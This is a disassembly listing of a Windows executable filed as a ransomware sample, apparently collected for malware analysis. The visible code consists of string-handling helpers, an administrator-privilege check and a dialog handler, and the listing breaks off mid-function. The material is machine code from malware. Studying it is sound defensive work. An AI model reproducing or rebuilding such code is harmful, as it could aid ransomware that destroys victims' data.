
malware_samples/ransomware/3e4539b9eebccf87d78328a5d0da8cbdcc8c960c37af0acf173460350dcbbbae.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	cc                   	int3
   140001001:	cc                   	int3
   140001002:	cc                   	int3
   140001003:	cc                   	int3
   140001004:	cc                   	int3
   140001005:	cc                   	int3
   140001006:	cc                   	int3
   140001007:	cc                   	int3
   140001008:	45 33 c9             	xor    %r9d,%r9d
   14000100b:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   14000100f:	41 ba fe ff ff 7f    	mov    $0x7ffffffe,%r10d
   140001015:	41 bb 57 00 07 80    	mov    $0x80070057,%r11d
   14000101b:	49 3b c2             	cmp    %r10,%rax
   14000101e:	45 0f 47 cb          	cmova  %r11d,%r9d
   140001022:	45 85 c9             	test   %r9d,%r9d
   140001025:	78 47                	js     0x14000106e
   140001027:	48 85 d2             	test   %rdx,%rdx
   14000102a:	74 22                	je     0x14000104e
   14000102c:	4c 2b d2             	sub    %rdx,%r10
   14000102f:	4c 2b c1             	sub    %rcx,%r8
   140001032:	49 8d 04 12          	lea    (%r10,%rdx,1),%rax
   140001036:	48 85 c0             	test   %rax,%rax
   140001039:	74 13                	je     0x14000104e
   14000103b:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   14000103f:	84 c0                	test   %al,%al
   140001041:	74 0b                	je     0x14000104e
   140001043:	88 01                	mov    %al,(%rcx)
   140001045:	48 ff c1             	inc    %rcx
   140001048:	48 83 ea 01          	sub    $0x1,%rdx
   14000104c:	75 e4                	jne    0x140001032
   14000104e:	48 85 d2             	test   %rdx,%rdx
   140001051:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140001055:	48 0f 45 c1          	cmovne %rcx,%rax
   140001059:	48 f7 da             	neg    %rdx
   14000105c:	45 1b c9             	sbb    %r9d,%r9d
   14000105f:	41 f7 d1             	not    %r9d
   140001062:	41 81 e1 7a 00 07 80 	and    $0x8007007a,%r9d
   140001069:	c6 00 00             	movb   $0x0,(%rax)
   14000106c:	eb 08                	jmp    0x140001076
   14000106e:	48 85 d2             	test   %rdx,%rdx
   140001071:	74 03                	je     0x140001076
   140001073:	c6 01 00             	movb   $0x0,(%rcx)
   140001076:	41 8b c1             	mov    %r9d,%eax
   140001079:	c3                   	ret
   14000107a:	cc                   	int3
   14000107b:	cc                   	int3
   14000107c:	cc                   	int3
   14000107d:	cc                   	int3
   14000107e:	cc                   	int3
   14000107f:	cc                   	int3
   140001080:	cc                   	int3
   140001081:	cc                   	int3
   140001082:	cc                   	int3
   140001083:	cc                   	int3
   140001084:	45 33 c9             	xor    %r9d,%r9d
   140001087:	4c 8b d2             	mov    %rdx,%r10
   14000108a:	4d 8b d8             	mov    %r8,%r11
   14000108d:	48 8b d1             	mov    %rcx,%rdx
   140001090:	41 b8 57 00 07 80    	mov    $0x80070057,%r8d
   140001096:	49 8d 42 ff          	lea    -0x1(%r10),%rax
   14000109a:	48 3d fe ff ff 7f    	cmp    $0x7ffffffe,%rax
   1400010a0:	45 0f 47 c8          	cmova  %r8d,%r9d
   1400010a4:	45 85 c9             	test   %r9d,%r9d
   1400010a7:	78 35                	js     0x1400010de
   1400010a9:	49 8b ca             	mov    %r10,%rcx
   1400010ac:	48 8b c2             	mov    %rdx,%rax
   1400010af:	4d 85 d2             	test   %r10,%r10
   1400010b2:	74 0e                	je     0x1400010c2
   1400010b4:	80 38 00             	cmpb   $0x0,(%rax)
   1400010b7:	74 09                	je     0x1400010c2
   1400010b9:	48 ff c0             	inc    %rax
   1400010bc:	48 83 e9 01          	sub    $0x1,%rcx
   1400010c0:	75 f2                	jne    0x1400010b4
   1400010c2:	48 8b c1             	mov    %rcx,%rax
   1400010c5:	48 f7 d8             	neg    %rax
   1400010c8:	45 1b c9             	sbb    %r9d,%r9d
   1400010cb:	41 f7 d1             	not    %r9d
   1400010ce:	45 23 c8             	and    %r8d,%r9d
   1400010d1:	48 85 c9             	test   %rcx,%rcx
   1400010d4:	74 08                	je     0x1400010de
   1400010d6:	4d 8b c2             	mov    %r10,%r8
   1400010d9:	4c 2b c1             	sub    %rcx,%r8
   1400010dc:	eb 03                	jmp    0x1400010e1
   1400010de:	45 33 c0             	xor    %r8d,%r8d
   1400010e1:	45 85 c9             	test   %r9d,%r9d
   1400010e4:	78 58                	js     0x14000113e
   1400010e6:	49 8b ca             	mov    %r10,%rcx
   1400010e9:	49 8d 14 10          	lea    (%r8,%rdx,1),%rdx
   1400010ed:	49 2b c8             	sub    %r8,%rcx
   1400010f0:	74 2e                	je     0x140001120
   1400010f2:	48 8b c1             	mov    %rcx,%rax
   1400010f5:	4d 8d 88 fe ff ff 7f 	lea    0x7ffffffe(%r8),%r9
   1400010fc:	49 2b c2             	sub    %r10,%rax
   1400010ff:	4c 03 c8             	add    %rax,%r9
   140001102:	4c 2b da             	sub    %rdx,%r11
   140001105:	4d 85 c9             	test   %r9,%r9
   140001108:	74 16                	je     0x140001120
   14000110a:	41 8a 04 13          	mov    (%r11,%rdx,1),%al
   14000110e:	84 c0                	test   %al,%al
   140001110:	74 0e                	je     0x140001120
   140001112:	88 02                	mov    %al,(%rdx)
   140001114:	49 ff c9             	dec    %r9
   140001117:	48 ff c2             	inc    %rdx
   14000111a:	48 83 e9 01          	sub    $0x1,%rcx
   14000111e:	75 e5                	jne    0x140001105
   140001120:	48 85 c9             	test   %rcx,%rcx
   140001123:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   140001127:	48 0f 45 c2          	cmovne %rdx,%rax
   14000112b:	48 f7 d9             	neg    %rcx
   14000112e:	45 1b c9             	sbb    %r9d,%r9d
   140001131:	41 f7 d1             	not    %r9d
   140001134:	41 81 e1 7a 00 07 80 	and    $0x8007007a,%r9d
   14000113b:	c6 00 00             	movb   $0x0,(%rax)
   14000113e:	41 8b c1             	mov    %r9d,%eax
   140001141:	c3                   	ret
   140001142:	cc                   	int3
   140001143:	cc                   	int3
   140001144:	cc                   	int3
   140001145:	cc                   	int3
   140001146:	cc                   	int3
   140001147:	cc                   	int3
   140001148:	cc                   	int3
   140001149:	cc                   	int3
   14000114a:	cc                   	int3
   14000114b:	cc                   	int3
   14000114c:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140001151:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140001156:	53                   	push   %rbx
   140001157:	56                   	push   %rsi
   140001158:	57                   	push   %rdi
   140001159:	48 83 ec 20          	sub    $0x20,%rsp
   14000115d:	33 ff                	xor    %edi,%edi
   14000115f:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   140001163:	48 3d fe ff ff 7f    	cmp    $0x7ffffffe,%rax
   140001169:	48 8b f1             	mov    %rcx,%rsi
   14000116c:	b9 57 00 07 80       	mov    $0x80070057,%ecx
   140001171:	0f 47 f9             	cmova  %ecx,%edi
   140001174:	85 ff                	test   %edi,%edi
   140001176:	78 3b                	js     0x1400011b3
   140001178:	48 8d 5a ff          	lea    -0x1(%rdx),%rbx
   14000117c:	48 8b ce             	mov    %rsi,%rcx
   14000117f:	48 8b d3             	mov    %rbx,%rdx
   140001182:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   140001187:	33 ff                	xor    %edi,%edi
   140001189:	48 ff 15 98 84 00 00 	rex.W call *0x8498(%rip)        # 0x140009628
   140001190:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001195:	85 c0                	test   %eax,%eax
   140001197:	78 0f                	js     0x1400011a8
   140001199:	48 98                	cltq
   14000119b:	48 3b c3             	cmp    %rbx,%rax
   14000119e:	77 08                	ja     0x1400011a8
   1400011a0:	75 19                	jne    0x1400011bb
   1400011a2:	40 88 3c 33          	mov    %dil,(%rbx,%rsi,1)
   1400011a6:	eb 13                	jmp    0x1400011bb
   1400011a8:	40 88 3c 33          	mov    %dil,(%rbx,%rsi,1)
   1400011ac:	bf 7a 00 07 80       	mov    $0x8007007a,%edi
   1400011b1:	eb 08                	jmp    0x1400011bb
   1400011b3:	48 85 d2             	test   %rdx,%rdx
   1400011b6:	74 03                	je     0x1400011bb
   1400011b8:	c6 06 00             	movb   $0x0,(%rsi)
   1400011bb:	8b c7                	mov    %edi,%eax
   1400011bd:	48 83 c4 20          	add    $0x20,%rsp
   1400011c1:	5f                   	pop    %rdi
   1400011c2:	5e                   	pop    %rsi
   1400011c3:	5b                   	pop    %rbx
   1400011c4:	c3                   	ret
   1400011c5:	cc                   	int3
   1400011c6:	cc                   	int3
   1400011c7:	cc                   	int3
   1400011c8:	cc                   	int3
   1400011c9:	cc                   	int3
   1400011ca:	cc                   	int3
   1400011cb:	cc                   	int3
   1400011cc:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400011d1:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1400011d6:	56                   	push   %rsi
   1400011d7:	57                   	push   %rdi
   1400011d8:	41 56                	push   %r14
   1400011da:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   1400011e1:	48 8b 05 20 ae 00 00 	mov    0xae20(%rip),%rax        # 0x14000c008
   1400011e8:	48 33 c4             	xor    %rsp,%rax
   1400011eb:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   1400011f0:	4c 8b f1             	mov    %rcx,%r14
   1400011f3:	66 c7 44 24 6c 00 05 	movw   $0x500,0x6c(%rsp)
   1400011fa:	33 ed                	xor    %ebp,%ebp
   1400011fc:	48 8d 0d 05 85 00 00 	lea    0x8505(%rip),%rcx        # 0x140009708
   140001203:	8b fd                	mov    %ebp,%edi
   140001205:	89 6c 24 68          	mov    %ebp,0x68(%rsp)
   140001209:	48 ff 15 08 80 00 00 	rex.W call *0x8008(%rip)        # 0x140009218
   140001210:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001215:	48 8b d8             	mov    %rax,%rbx
   140001218:	48 85 c0             	test   %rax,%rax
   14000121b:	0f 84 9a 00 00 00    	je     0x1400012bb
   140001221:	48 8d 15 f0 84 00 00 	lea    0x84f0(%rip),%rdx        # 0x140009718
   140001228:	48 8b c8             	mov    %rax,%rcx
   14000122b:	48 ff 15 2e 80 00 00 	rex.W call *0x802e(%rip)        # 0x140009260
   140001232:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001237:	48 8b f0             	mov    %rax,%rsi
   14000123a:	48 85 c0             	test   %rax,%rax
   14000123d:	74 6d                	je     0x1400012ac
   14000123f:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   140001244:	41 89 2e             	mov    %ebp,(%r14)
   140001247:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000124c:	44 8d 45 20          	lea    0x20(%rbp),%r8d
   140001250:	89 6c 24 48          	mov    %ebp,0x48(%rsp)
   140001254:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   140001259:	89 6c 24 40          	mov    %ebp,0x40(%rsp)
   14000125d:	8d 7d 01             	lea    0x1(%rbp),%edi
   140001260:	89 6c 24 38          	mov    %ebp,0x38(%rsp)
   140001264:	41 b9 20 02 00 00    	mov    $0x220,%r9d
   14000126a:	89 6c 24 30          	mov    %ebp,0x30(%rsp)
   14000126e:	b2 02                	mov    $0x2,%dl
   140001270:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   140001274:	89 6c 24 20          	mov    %ebp,0x20(%rsp)
   140001278:	48 ff 15 f1 7e 00 00 	rex.W call *0x7ef1(%rip)        # 0x140009170
   14000127f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001284:	85 c0                	test   %eax,%eax
   140001286:	74 24                	je     0x1400012ac
   140001288:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   14000128d:	4d 8b c6             	mov    %r14,%r8
   140001290:	33 c9                	xor    %ecx,%ecx
   140001292:	48 8b c6             	mov    %rsi,%rax
   140001295:	ff 15 b5 83 00 00    	call   *0x83b5(%rip)        # 0x140009650
   14000129b:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   1400012a0:	48 ff 15 a1 7e 00 00 	rex.W call *0x7ea1(%rip)        # 0x140009148
   1400012a7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400012ac:	48 8b cb             	mov    %rbx,%rcx
   1400012af:	48 ff 15 ca 7f 00 00 	rex.W call *0x7fca(%rip)        # 0x140009280
   1400012b6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400012bb:	8b c7                	mov    %edi,%eax
   1400012bd:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   1400012c2:	48 33 cc             	xor    %rsp,%rcx
   1400012c5:	e8 a6 71 00 00       	call   0x140008470
   1400012ca:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   1400012d1:	00 
   1400012d2:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   1400012d6:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   1400012da:	49 8b e3             	mov    %r11,%rsp
   1400012dd:	41 5e                	pop    %r14
   1400012df:	5f                   	pop    %rdi
   1400012e0:	5e                   	pop    %rsi
   1400012e1:	c3                   	ret
   1400012e2:	cc                   	int3
   1400012e3:	cc                   	int3
   1400012e4:	cc                   	int3
   1400012e5:	cc                   	int3
   1400012e6:	cc                   	int3
   1400012e7:	cc                   	int3
   1400012e8:	cc                   	int3
   1400012e9:	cc                   	int3
   1400012ea:	cc                   	int3
   1400012eb:	cc                   	int3
   1400012ec:	48 8b c4             	mov    %rsp,%rax
   1400012ef:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400012f3:	48 89 70 10          	mov    %rsi,0x10(%rax)
   1400012f7:	48 89 78 18          	mov    %rdi,0x18(%rax)
   1400012fb:	4c 89 70 20          	mov    %r14,0x20(%rax)
   1400012ff:	55                   	push   %rbp
   140001300:	48 8d 68 a1          	lea    -0x5f(%rax),%rbp
   140001304:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   14000130b:	48 8b 05 f6 ac 00 00 	mov    0xacf6(%rip),%rax        # 0x14000c008
   140001312:	48 33 c4             	xor    %rsp,%rax
   140001315:	48 89 45 47          	mov    %rax,0x47(%rbp)
   140001319:	8b 05 2d ae 00 00    	mov    0xae2d(%rip),%eax        # 0x14000c14c
   14000131f:	45 33 f6             	xor    %r14d,%r14d
   140001322:	44 89 75 3f          	mov    %r14d,0x3f(%rbp)
   140001326:	66 c7 45 43 00 05    	movw   $0x500,0x43(%rbp)
   14000132c:	44 89 75 27          	mov    %r14d,0x27(%rbp)
   140001330:	41 8d 5e 02          	lea    0x2(%r14),%ebx
   140001334:	3b c3                	cmp    %ebx,%eax
   140001336:	0f 85 92 01 00 00    	jne    0x1400014ce
   14000133c:	48 8d 4d 27          	lea    0x27(%rbp),%rcx
   140001340:	e8 87 fe ff ff       	call   0x1400011cc
   140001345:	85 c0                	test   %eax,%eax
   140001347:	0f 85 68 01 00 00    	jne    0x1400014b5
   14000134d:	48 ff 15 8c 80 00 00 	rex.W call *0x808c(%rip)        # 0x1400093e0
   140001354:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001359:	48 8b c8             	mov    %rax,%rcx
   14000135c:	4c 8d 45 2f          	lea    0x2f(%rbp),%r8
   140001360:	8d 53 06             	lea    0x6(%rbx),%edx
   140001363:	48 ff 15 e6 7d 00 00 	rex.W call *0x7de6(%rip)        # 0x140009150
   14000136a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000136f:	85 c0                	test   %eax,%eax
   140001371:	0f 84 57 01 00 00    	je     0x1400014ce
   140001377:	48 8b 4d 2f          	mov    0x2f(%rbp),%rcx
   14000137b:	48 8d 45 2b          	lea    0x2b(%rbp),%rax
   14000137f:	45 33 c9             	xor    %r9d,%r9d
   140001382:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001387:	45 33 c0             	xor    %r8d,%r8d
   14000138a:	8b d3                	mov    %ebx,%edx
   14000138c:	48 ff 15 95 7d 00 00 	rex.W call *0x7d95(%rip)        # 0x140009128
   140001393:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001398:	85 c0                	test   %eax,%eax
   14000139a:	0f 85 00 01 00 00    	jne    0x1400014a0
   1400013a0:	48 ff 15 59 7e 00 00 	rex.W call *0x7e59(%rip)        # 0x140009200
   1400013a7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400013ac:	83 f8 7a             	cmp    $0x7a,%eax
   1400013af:	0f 85 eb 00 00 00    	jne    0x1400014a0
   1400013b5:	8b 55 2b             	mov    0x2b(%rbp),%edx
   1400013b8:	33 c9                	xor    %ecx,%ecx
   1400013ba:	48 ff 15 07 80 00 00 	rex.W call *0x8007(%rip)        # 0x1400093c8
   1400013c1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400013c6:	48 8b f8             	mov    %rax,%rdi
   1400013c9:	48 85 c0             	test   %rax,%rax
   1400013cc:	0f 84 ce 00 00 00    	je     0x1400014a0
   1400013d2:	44 8b 4d 2b          	mov    0x2b(%rbp),%r9d
   1400013d6:	48 8d 45 2b          	lea    0x2b(%rbp),%rax
   1400013da:	48 8b 4d 2f          	mov    0x2f(%rbp),%rcx
   1400013de:	4c 8b c7             	mov    %rdi,%r8
   1400013e1:	8b d3                	mov    %ebx,%edx
   1400013e3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400013e8:	48 ff 15 39 7d 00 00 	rex.W call *0x7d39(%rip)        # 0x140009128
   1400013ef:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400013f4:	85 c0                	test   %eax,%eax
   1400013f6:	0f 84 95 00 00 00    	je     0x140001491
   1400013fc:	48 8d 45 37          	lea    0x37(%rbp),%rax
   140001400:	41 b9 20 02 00 00    	mov    $0x220,%r9d
   140001406:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000140b:	48 8d 4d 3f          	lea    0x3f(%rbp),%rcx
   14000140f:	44 89 74 24 48       	mov    %r14d,0x48(%rsp)
   140001414:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   14000141a:	44 89 74 24 40       	mov    %r14d,0x40(%rsp)
   14000141f:	8a d3                	mov    %bl,%dl
   140001421:	44 89 74 24 38       	mov    %r14d,0x38(%rsp)
   140001426:	44 89 74 24 30       	mov    %r14d,0x30(%rsp)
   14000142b:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   140001430:	44 89 74 24 20       	mov    %r14d,0x20(%rsp)
   140001435:	48 ff 15 34 7d 00 00 	rex.W call *0x7d34(%rip)        # 0x140009170
   14000143c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001441:	85 c0                	test   %eax,%eax
   140001443:	74 4c                	je     0x140001491
   140001445:	41 8b f6             	mov    %r14d,%esi
   140001448:	44 39 37             	cmp    %r14d,(%rdi)
   14000144b:	76 34                	jbe    0x140001481
   14000144d:	bb 01 00 00 00       	mov    $0x1,%ebx
   140001452:	48 8b 55 37          	mov    0x37(%rbp),%rdx
   140001456:	8b ce                	mov    %esi,%ecx
   140001458:	48 03 c9             	add    %rcx,%rcx
   14000145b:	48 8b 4c cf 08       	mov    0x8(%rdi,%rcx,8),%rcx
   140001460:	48 ff 15 19 7d 00 00 	rex.W call *0x7d19(%rip)        # 0x140009180
   140001467:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000146c:	85 c0                	test   %eax,%eax
   14000146e:	75 08                	jne    0x140001478
   140001470:	03 f3                	add    %ebx,%esi
   140001472:	3b 37                	cmp    (%rdi),%esi
   140001474:	72 dc                	jb     0x140001452
   140001476:	eb 09                	jmp    0x140001481
   140001478:	89 1d ce ac 00 00    	mov    %ebx,0xacce(%rip)        # 0x14000c14c
   14000147e:	89 5d 27             	mov    %ebx,0x27(%rbp)
   140001481:	48 8b 4d 37          	mov    0x37(%rbp),%rcx
   140001485:	48 ff 15 bc 7c 00 00 	rex.W call *0x7cbc(%rip)        # 0x140009148
   14000148c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001491:	48 8b cf             	mov    %rdi,%rcx
   140001494:	48 ff 15 d5 7d 00 00 	rex.W call *0x7dd5(%rip)        # 0x140009270
   14000149b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400014a0:	48 8b 4d 2f          	mov    0x2f(%rbp),%rcx
   1400014a4:	48 ff 15 8d 7d 00 00 	rex.W call *0x7d8d(%rip)        # 0x140009238
   1400014ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400014b0:	8b 45 27             	mov    0x27(%rbp),%eax
   1400014b3:	eb 19                	jmp    0x1400014ce
   1400014b5:	8b 0d 91 ac 00 00    	mov    0xac91(%rip),%ecx        # 0x14000c14c
   1400014bb:	bb 01 00 00 00       	mov    $0x1,%ebx
   1400014c0:	8b 45 27             	mov    0x27(%rbp),%eax
   1400014c3:	85 c0                	test   %eax,%eax
   1400014c5:	0f 45 cb             	cmovne %ebx,%ecx
   1400014c8:	89 0d 7e ac 00 00    	mov    %ecx,0xac7e(%rip)        # 0x14000c14c
   1400014ce:	48 8b 4d 47          	mov    0x47(%rbp),%rcx
   1400014d2:	48 33 cc             	xor    %rsp,%rcx
   1400014d5:	e8 96 6f 00 00       	call   0x140008470
   1400014da:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   1400014e1:	00 
   1400014e2:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   1400014e6:	49 8b 73 18          	mov    0x18(%r11),%rsi
   1400014ea:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   1400014ee:	4d 8b 73 28          	mov    0x28(%r11),%r14
   1400014f2:	49 8b e3             	mov    %r11,%rsp
   1400014f5:	5d                   	pop    %rbp
   1400014f6:	c3                   	ret
   1400014f7:	cc                   	int3
   1400014f8:	cc                   	int3
   1400014f9:	cc                   	int3
   1400014fa:	cc                   	int3
   1400014fb:	cc                   	int3
   1400014fc:	cc                   	int3
   1400014fd:	cc                   	int3
   1400014fe:	cc                   	int3
   1400014ff:	cc                   	int3
   140001500:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001505:	57                   	push   %rdi
   140001506:	48 81 ec 30 02 00 00 	sub    $0x230,%rsp
   14000150d:	48 8b 05 f4 aa 00 00 	mov    0xaaf4(%rip),%rax        # 0x14000c008
   140001514:	48 33 c4             	xor    %rsp,%rax
   140001517:	48 89 84 24 20 02 00 	mov    %rax,0x220(%rsp)
   14000151e:	00 
   14000151f:	49 8b f9             	mov    %r9,%rdi
   140001522:	49 8b c0             	mov    %r8,%rax
   140001525:	48 8b d9             	mov    %rcx,%rbx
   140001528:	81 ea 10 01 00 00    	sub    $0x110,%edx
   14000152e:	74 27                	je     0x140001557
   140001530:	83 fa 01             	cmp    $0x1,%edx
   140001533:	75 1e                	jne    0x140001553
   140001535:	49 81 c0 c3 f7 ff ff 	add    $0xfffffffffffff7c3,%r8
   14000153c:	49 83 f8 01          	cmp    $0x1,%r8
   140001540:	77 11                	ja     0x140001553
   140001542:	48 8b d0             	mov    %rax,%rdx
   140001545:	48 ff 15 f4 7f 00 00 	rex.W call *0x7ff4(%rip)        # 0x140009540
   14000154c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001551:	eb 68                	jmp    0x1400015bb
   140001553:	33 c0                	xor    %eax,%eax
   140001555:	eb 69                	jmp    0x1400015c0
   140001557:	48 ff 15 0a 80 00 00 	rex.W call *0x800a(%rip)        # 0x140009568
   14000155e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001563:	48 8b d0             	mov    %rax,%rdx
   140001566:	48 8b cb             	mov    %rbx,%rcx
   140001569:	e8 fa 36 00 00       	call   0x140004c68
   14000156e:	48 8b 0d fb c8 00 00 	mov    0xc8fb(%rip),%rcx        # 0x14000de70
   140001575:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   14000157a:	41 b9 00 02 00 00    	mov    $0x200,%r9d
   140001580:	c6 44 24 20 00       	movb   $0x0,0x20(%rsp)
   140001585:	8b d7                	mov    %edi,%edx
   140001587:	48 ff 15 a2 7f 00 00 	rex.W call *0x7fa2(%rip)        # 0x140009530
   14000158e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001593:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140001598:	ba 3f 08 00 00       	mov    $0x83f,%edx
   14000159d:	48 8b cb             	mov    %rbx,%rcx
   1400015a0:	48 ff 15 b1 7f 00 00 	rex.W call *0x7fb1(%rip)        # 0x140009558
   1400015a7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400015ac:	83 c9 ff             	or     $0xffffffff,%ecx
   1400015af:	48 ff 15 92 7f 00 00 	rex.W call *0x7f92(%rip)        # 0x140009548
   1400015b6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400015bb:	b8 01 00 00 00       	mov    $0x1,%eax
   1400015c0:	48 8b 8c 24 20 02 00 	mov    0x220(%rsp),%rcx
   1400015c7:	00 
   1400015c8:	48 33 cc             	xor    %rsp,%rcx
   1400015cb:	e8 a0 6e 00 00       	call   0x140008470
   1400015d0:	48 8b 9c 24 48 02 00 	mov    0x248(%rsp),%rbx
   1400015d7:	00 
   1400015d8:	48 81 c4 30 02 00 00 	add    $0x230,%rsp
   1400015df:	5f                   	pop    %rdi
   1400015e0:	c3                   	ret
   1400015e1:	cc                   	int3
   1400015e2:	cc                   	int3
   1400015e3:	cc                   	int3
   1400015e4:	cc                   	int3
   1400015e5:	cc                   	int3
   1400015e6:	cc                   	int3
   1400015e7:	cc                   	int3
   1400015e8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400015ed:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400015f2:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400015f7:	57                   	push   %rdi
   1400015f8:	48 83 ec 20          	sub    $0x20,%rsp
   1400015fc:	48 8b 19             	mov    (%rcx),%rbx
   1400015ff:	48 8b f2             	mov    %rdx,%rsi
   140001602:	48 8b f9             	mov    %rcx,%rdi
   140001605:	33 ed                	xor    %ebp,%ebp
   140001607:	eb 08                	jmp    0x140001611
   140001609:	40 38 2b             	cmp    %bpl,(%rbx)
   14000160c:	74 6a                	je     0x140001678
   14000160e:	48 ff c3             	inc    %rbx
   140001611:	0f be 13             	movsbl (%rbx),%edx
   140001614:	48 8b ce             	mov    %rsi,%rcx
   140001617:	e8 cc 66 00 00       	call   0x140007ce8
   14000161c:	48 85 c0             	test   %rax,%rax
   14000161f:	75 e8                	jne    0x140001609
   140001621:	0f be 13             	movsbl (%rbx),%edx
   140001624:	48 8b ce             	mov    %rsi,%rcx
   140001627:	48 89 1f             	mov    %rbx,(%rdi)
   14000162a:	e8 b9 66 00 00       	call   0x140007ce8
   14000162f:	48 85 c0             	test   %rax,%rax
   140001632:	75 1d                	jne    0x140001651
   140001634:	48 8b fb             	mov    %rbx,%rdi
   140001637:	80 3f 00             	cmpb   $0x0,(%rdi)
   14000163a:	74 15                	je     0x140001651
   14000163c:	48 ff c7             	inc    %rdi
   14000163f:	48 8b ce             	mov    %rsi,%rcx
   140001642:	ff c5                	inc    %ebp
   140001644:	0f be 17             	movsbl (%rdi),%edx
   140001647:	e8 9c 66 00 00       	call   0x140007ce8
   14000164c:	48 85 c0             	test   %rax,%rax
   14000164f:	74 e6                	je     0x140001637
   140001651:	48 63 c5             	movslq %ebp,%rax
   140001654:	48 03 c3             	add    %rbx,%rax
   140001657:	80 38 00             	cmpb   $0x0,(%rax)
   14000165a:	74 06                	je     0x140001662
   14000165c:	c6 00 00             	movb   $0x0,(%rax)
   14000165f:	48 ff c0             	inc    %rax
   140001662:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001667:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000166c:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140001671:	48 83 c4 20          	add    $0x20,%rsp
   140001675:	5f                   	pop    %rdi
   140001676:	c3                   	ret
   140001677:	cc                   	int3
   140001678:	33 c0                	xor    %eax,%eax
   14000167a:	eb e6                	jmp    0x140001662
   14000167c:	cc                   	int3
   14000167d:	cc                   	int3
   14000167e:	cc                   	int3
   14000167f:	cc                   	int3
   140001680:	cc                   	int3
   140001681:	cc                   	int3
   140001682:	cc                   	int3
   140001683:	cc                   	int3
   140001684:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001689:	55                   	push   %rbp
   14000168a:	56                   	push   %rsi
   14000168b:	57                   	push   %rdi
   14000168c:	41 54                	push   %r12
   14000168e:	41 55                	push   %r13
   140001690:	41 56                	push   %r14
   140001692:	41 57                	push   %r15
   140001694:	48 8d ac 24 90 fa ff 	lea    -0x570(%rsp),%rbp
   14000169b:	ff 
   14000169c:	48 81 ec 70 06 00 00 	sub    $0x670,%rsp
   1400016a3:	48 8b 05 5e a9 00 00 	mov    0xa95e(%rip),%rax        # 0x14000c008
   1400016aa:	48 33 c4             	xor    %rsp,%rax
   1400016ad:	48 89 85 60 05 00 00 	mov    %rax,0x560(%rbp)
   1400016b4:	4c 8b f1             	mov    %rcx,%r14
   1400016b7:	48 8d 45 50          	lea    0x50(%rbp),%rax
   1400016bb:	4d 8b d6             	mov    %r14,%r10
   1400016be:	48 8d 4d 50          	lea    0x50(%rbp),%rcx
   1400016c2:	4c 2b d0             	sub    %rax,%r10
   1400016c5:	4d 8b f9             	mov    %r9,%r15
   1400016c8:	45 33 ed             	xor    %r13d,%r13d
   1400016cb:	4d 8b e0             	mov    %r8,%r12
   1400016ce:	ba 04 01 00 00       	mov    $0x104,%edx
